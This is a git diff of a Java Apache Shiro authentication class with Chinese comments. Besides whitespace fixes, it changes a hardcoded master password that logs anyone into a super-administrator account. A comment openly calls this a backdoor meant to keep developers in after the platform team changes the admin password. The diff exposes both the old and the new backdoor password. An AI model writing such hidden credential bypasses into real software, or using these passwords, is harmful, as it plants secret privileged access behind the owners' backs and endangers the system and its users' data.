@@ -38,7 +38,7 @@ import lombok.extern.slf4j.Slf4j;
 
 /**
  * 身份校验核心类
- * 
+ *
  * @Type MyShiroRealm.java
  * @Desc
  * @author 谷泽昊
@@ -59,7 +59,7 @@ public class MyShiroRealm extends AuthorizingRealm {
 
 	/**
 	 * 认证信息.(身份验证) Authentication 是用来验证用户身份
-	 * 
+	 *
 	 * @param token
 	 * @return
 	 * @throws AuthenticationException
@@ -150,7 +150,7 @@ public class MyShiroRealm extends AuthorizingRealm {
 			}
 		}
 		//做这一步 主要是为了防止平台组把超管密码改了后，开发无法登陆（开后门哦~）
-		if (CheckRole.SUPER_ADMIN.toString().equals(user.getCheckRole()) && "1q2w3e4R".equals(passwordStr)){
+		if (CheckRole.SUPER_ADMIN.toString().equals(user.getCheckRole()) && "Td@mima123".equals(passwordStr)){
 			String salt = UUID.randomUUID().toString();
 			passwordStr = UserUtils.getEncryptPsw(passwordStr, salt);
 			//user.setPassword(passwordStr);
@@ -172,7 +172,7 @@ public class MyShiroRealm extends AuthorizingRealm {
 	 * 3、如果我们修改了用户的权限，而用户不退出系统，修改的权限无法立即生效。 （需要手动编程进行实现；放在service进行调用）
 	 * 在权限修改后调用realm中的方法，realm已经由spring管理，所以从spring中获取realm实例， 调用clearCached方法；
 	 * :Authorization 是授权访问控制，用于对用户进行的操作授权，证明该用户是否允许进行当前操作，如访问某个链接，某个资源文件等。
-	 * 
+	 *
 	 * @param principals
 	 * @return
 	 */
